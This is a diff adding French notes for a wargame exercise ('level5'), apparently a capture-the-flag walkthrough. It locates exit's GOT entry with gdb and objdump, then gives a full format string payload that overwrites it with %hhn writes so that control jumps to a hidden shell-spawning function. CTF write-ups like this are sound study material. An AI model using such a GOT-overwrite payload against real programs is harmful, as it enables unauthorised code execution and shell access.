@@ -1,0 +1,28 @@
+addresse de l'instruction:0x080483d0
+contient :
+(gdb) x/6xb 0x80483d0
+0x80483d0 <exit@plt>:   0xff    0x25    0x38    0x98    0x04    0x08
+
+adresse de exit, on veut la remplacer
+via le printf par 080484a4 <o>, une fonction non
+appellee mais qui lance un shell
+
+on trouve les adresses des fonctions via:
+objdump -d ./level5 | grep o et
+objdump -R /home/user/level5/level5 | grep exit
+
+on voir cette ligne dans exit
+
+=> 0x80483d0 <exit@plt>:        jmp    *0x8049838
+*addr veut dire que le programme jump a l'adresse contenu
+par l'adresse 0x8049838
+
+on veut donc ecrire :
+080484a4
+qui devient:
+\xa4\x84\x04\x08
+
+a l'adresse 0x8049838
+\x38\x98\x04\x08
+
+echo -e "\x38\x98\x04\x08\x39\x98\x04\x08\x3a\x98\x04\x08\x3b\x98\x04\x08%244c%6\$hhn%4c%7\$hhn%124c%5\$hhn%32c%4\$hhn" > /tmp/i
